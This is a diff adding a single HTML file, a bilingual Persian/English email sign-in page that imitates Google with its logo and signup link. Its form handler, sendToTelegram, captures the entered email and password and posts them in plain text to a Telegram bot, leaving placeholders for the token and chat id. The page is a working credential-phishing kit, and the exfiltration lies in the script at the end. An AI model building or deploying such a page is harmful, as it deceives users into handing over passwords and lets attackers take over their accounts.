@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ورود به ایمیل</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            direction: rtl;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        .login-container h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #202124;
+        }
+        .login-container input[type="email"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .login-container input[type="email"]:focus,
+        .login-container input[type="password"]:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        .login-container button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        .login-container button:hover {
+            background-color: #1669c7;
+        }
+        .login-container .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .login-container .logo {
+            margin-bottom: 20px;
+        }
+        .login-container .logo img {
+            width: 120px;
+        }
+        .language-selector {
+            margin-bottom: 20px;
+        }
+        .language-selector select {
+            padding: 8px;
+            font-size: 14px;
+        }
+        .extra-options {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .extra-options a {
+            color: #1a73e8;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        .extra-options a:hover {
+            color: #1669c7;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="language-selector">
+            <select id="language-select" onchange="changeLanguage()">
+                <option value="fa">فارسی</option>
+                <option value="en">English</option>
+            </select>
+        </div>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/512px-Google_2015_logo.svg.png" alt="Google Logo">
+        </div>
+        <h1 id="title">ورود به حساب ایمیل</h1>
+        <form id="login-form" onsubmit="sendToTelegram(event)">
+            <input type="email" id="email" placeholder="ایمیل" required>
+            <input type="password" id="password" placeholder="رمز عبور" required>
+            <button type="submit" id="login-button">ورود</button>
+        </form>
+        <div class="extra-options">
+            <a href="#" id="forgot-password">فراموشی رمز عبور؟</a> | 
+            <a href="https://accounts.google.com/signup" id="create-account" target="_blank">ایجاد حساب ایمیل</a>
+        </div>
+        <div class="footer">
+            <p>© 2023 شرکت شما</p>
+        </div>
+    </div>
+
+    <script>
+        function changeLanguage() {
+            const lang = document.getElementById('language-select').value;
+            if (lang === 'fa') {
+                document.documentElement.lang = 'fa';
+                document.body.style.direction = 'rtl';
+                document.getElementById('title').textContent = 'ورود به حساب ایمیل';
+                document.getElementById('email').placeholder = 'ایمیل';
+                document.getElementById('password').placeholder = 'رمز عبور';
+                document.getElementById('login-button').textContent = 'ورود';
+                document.getElementById('forgot-password').textContent = 'فراموشی رمز عبور؟';
+                document.getElementById('create-account').textContent = 'ایجاد حساب ایمیل';
+            } else if (lang === 'en') {
+                document.documentElement.lang = 'en';
+                document.body.style.direction = 'ltr';
+                document.getElementById('title').textContent = 'Sign in to your email';
+                document.getElementById('email').placeholder = 'Email';
+                document.getElementById('password').placeholder = 'Password';
+                document.getElementById('login-button').textContent = 'Sign in';
+                document.getElementById('forgot-password').textContent = 'Forgot password?';
+                document.getElementById('create-account').textContent = 'Create an account';
+            }
+        }
+
+        async function sendToTelegram(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const message = `Email: ${email}\nPassword: ${password}`;
+            const telegramApiUrl = `https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`;
+
+            try {
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: 'YOUR_CHAT_ID',
+                        text: message
+                    })
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                    alert('اطلاعات با موفقیت ارسال شد.');
+                } else {
+                    alert('خطا در ارسال اطلاعات.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('خطا در ارسال اطلاعات.');
+            }
+        }
+
+        // Initialize with default language
+        changeLanguage();
+    </script>
+</body>
+</html>
